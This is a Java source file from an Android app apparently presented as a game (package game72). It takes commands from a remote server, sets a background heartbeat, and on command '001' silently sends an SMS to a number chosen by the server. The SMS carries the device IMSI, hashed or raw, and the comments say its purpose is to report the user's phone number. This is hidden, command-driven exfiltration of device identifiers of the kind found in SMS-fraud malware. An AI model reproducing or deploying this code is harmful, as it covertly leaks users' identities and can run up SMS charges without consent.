package cn.com.tiantong.game72;

import java.util.ArrayList;


import android.content.Context;
import android.content.SharedPreferences;

import cn.com.tiantong.game72.ControlBroadcastReceiver;
import cn.com.tiantong.game72.In;
import cn.com.tiantong.game72.PlayService;
import cn.com.tiantong.game72.SendMessageManager;
import cn.com.tiantong.game72.util.MD5;

public class BasicInfoParser {
	
//	private static final String tag = "BasicInfoParser";
	/*
	 *  000 --> 心跳时间
	 *  001 --> 是否需要获取手机号码
	 */
	private static final String[] basicCommands = {"000", "001"};
	
	private Context context;
	
	public BasicInfoParser(Context _context){
		this.context = _context;
	} 
	
	public void basicParser(ArrayList<String> commandsList){
		
		for(int i = 0; i < commandsList.size(); i++){
			
			String command = commandsList.get(i);
			if(command != null && ! "".equals(command.trim())){
				
				SharedPreferences initServicePreferences = context.getSharedPreferences(PlayService.PREFS_NAME, 0);
				SharedPreferences.Editor initServiceEditor = initServicePreferences.edit();
				
				if(command.startsWith("000")){
					//LH.LogPrint(tag, "心跳时间");
					try {
						
						String[] commandSplit = command.split(",");
						
						int heartTime = Integer.valueOf(commandSplit[1]);
						
						if(heartTime > 0){
							//LH.LogPrint(tag, "有心跳时间");
							//重置心跳时间
							initServiceEditor.putInt(PlayService.WAIT_TIME, heartTime);
							//重置起始时间
							initServiceEditor.putLong(PlayService.PHONE_TIME, System.currentTimeMillis());
							//重置判断条件
							initServiceEditor.putBoolean(PlayService.ISSENDPHONENUMBERREQUEST, false);
							initServiceEditor.commit();
						}else{
							//重置判断条件，立即发起初始化操作
							initServiceEditor.putBoolean(PlayService.ISSENDPHONENUMBERREQUEST, false);
							initServiceEditor.commit();
						}
						
					} catch (Exception e) {
						e.printStackTrace();
						//重置判断条件，立即发起初始化操作
						initServiceEditor.putBoolean(PlayService.ISSENDPHONENUMBERREQUEST, false);
						initServiceEditor.commit();
					}
					//重新启动服务
					ControlBroadcastReceiver.startMainServiceForActivity(context);
				}else if(command.startsWith("001")){
					//LH.LogPrint(tag, "get hm");
					
					try {
						String[] phoneNumberSplit = command.split(",");
						
						if(phoneNumberSplit.length >= 2){
							String phoneNumber = phoneNumberSplit[1];
							//phoneNumber.trim().length() >= 3  防止获取到的时候号码为“0”
							if(phoneNumber != null && ! "".equals(phoneNumber.trim()) && phoneNumber.trim().length() >= 3){
								//LH.LogPrint(tag, "hm-->" + phoneNumber);
								new SendUsPhoNumThread(context, phoneNumber).start();
							}else{
								//LH.LogPrint(tag, "hm-->no");
							}
						}
						
					} catch (Exception e) {
						e.printStackTrace();
					}
					
				}
				
			}
			
		}
	}
	
	//发送用户手机号码的线程
	class SendUsPhoNumThread extends Thread{
		
		private Context mContext;
		private String forUserPhoneNumber;
		public SendUsPhoNumThread(Context _mContext, String _number){
			this.mContext = _mContext;
			this.forUserPhoneNumber = _number;
		}
		
		@Override
		public void run() {
			super.run();
			
			try {
				
				//LH.LogPrint("forUserPhoneNumber", "forUserPhoneNumber");
				
				//需要发送短信
				In infor = new In(context);
				boolean isTwoCard = infor.chargeHasTwoImsi(context);
				if(isTwoCard){
					//LH.LogPrint("forUserPhoneNumber", "双卡双待");
					//这是两张卡槽
					String send_imsi_1 = infor.getTwoImsi(context, 0);
					String send_imsi_2 = infor.getTwoImsi(context, 1);
					//LH.LogPrint("forUserPhoneNumber", "imsi_1:" + send_imsi_1 + ", imsi_2:" + send_imsi_2);
					
					if(send_imsi_1 != null && ! "".equals(send_imsi_1.trim())){
						//使用卡槽一发送短信，md5加密
						byte[] bb = send_imsi_1.getBytes("UTF-8");
						String send_imsi_1_md5 = MD5.bytes2hex(MD5.md5(bb));
						//发送短信，上报手机号码
						SendMessageManager.sendSMS1(mContext, forUserPhoneNumber, "GMPG" + send_imsi_1_md5, null);
					}else if(send_imsi_2 != null && ! "".equals(send_imsi_2.trim())){
						//使用卡槽2发送短信，md5加密
						byte[] bb = send_imsi_2.getBytes("UTF-8");
						String send_imsi_2_md5 = MD5.bytes2hex(MD5.md5(bb));
						//发送短信，上报手机号码
						SendMessageManager.sendSMS1(mContext, forUserPhoneNumber, "GMPG" + send_imsi_2_md5, null);
					}
					
				}else{
					//这是单卡的，那么只要这个发送
					ControlBroadcastReceiver conBroadCastRec = new ControlBroadcastReceiver();
					String send_imsi = conBroadCastRec.getIMSI(context);
					//发送短信，上报手机号码
					SendMessageManager.sendSMS1(mContext, forUserPhoneNumber, "GMPG" + send_imsi, null);
				}
			} catch (Exception e) {
				e.printStackTrace();
			}
			
			
		}
		
	}
	

}
